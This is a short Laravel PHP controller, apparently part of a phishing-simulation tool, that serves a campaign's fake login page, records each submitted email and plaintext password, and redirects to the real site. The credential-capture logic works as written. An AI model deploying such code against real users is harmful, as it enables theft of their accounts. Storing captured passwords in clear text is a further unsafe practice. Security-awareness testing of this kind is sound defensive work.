<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Campaign;
use App\Models\PhishingLog;

class PhishingController extends Controller
{
    public function showLogin(Campaign $campaign)
    {
        return view('phish.login', compact('campaign'));
    }

    public function handleLogin(Request $request, Campaign $campaign)
    {
        // Store captured credentials (simulation)
        PhishingLog::create([
            'campaign_id' => $campaign->id,
            'email' => $request->email,
            'password' => $request->password,
            'clicked_at' => now()
        ]);

        // Redirect to original site
        return redirect($campaign->redirect_url);
    }
}
